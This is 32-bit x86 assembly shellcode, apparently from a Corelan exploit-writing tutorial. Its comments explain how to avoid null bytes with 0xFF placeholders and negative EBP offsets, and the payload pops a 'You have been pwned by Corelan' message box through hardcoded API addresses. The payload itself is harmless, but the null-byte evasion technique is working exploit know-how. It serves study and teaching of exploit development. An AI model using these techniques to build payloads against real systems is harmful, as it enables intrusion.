; put current location of the stack into ebp
; set a register to zero
; write value to the stack without null bytes (so replace the null byte with something else)
; overwrite the byte on the stack with a null byte, using a part of a register that already contains null, and referring to a negative offset from ebp.
; Using a negative offset will result in \xff bytes (and not \x00 bytes), thys bypassing the null byte limitation
[BITS 32]

XOR EAX,EAX     ;set EAX to zero
MOV EBP,ESP     ;set EBP to ESP so we can use negative offset
PUSH 0xFF6E616C ;push part of string to stack
MOV [EBP-1],AL  ;overwrite FF with 00
PUSH 0x65726f43 ;push rest of string to stack
MOV EBX,ESP     ;save pointer to "Corelan" in EBX

PUSH 0xFF206E61 ;push part of string to stack
MOV [EBP-9],AL  ;overwrite FF with 00
PUSH 0x6c65726f ;push rest of string to stack
PUSH 0x43207962
PUSH 0x2064656e
PUSH 0x7770206e
PUSH 0x65656220
PUSH 0x65766168
PUSH 0x20756f59
MOV ECX,ESP         ;save pointer to "You have been..." in ECX

PUSH EAX            ;put parameters on the stack
PUSH EBX
PUSH ECX
PUSH EAX
PUSH EAX

MOV ESI,0x7E4507EA
JMP ESI              ;MessageBoxA

XOR EAX,EAX          ;clean up
PUSH EAX
MOV EAX,0x7c81CB12
JMP EAX              ;ExitProcess(0)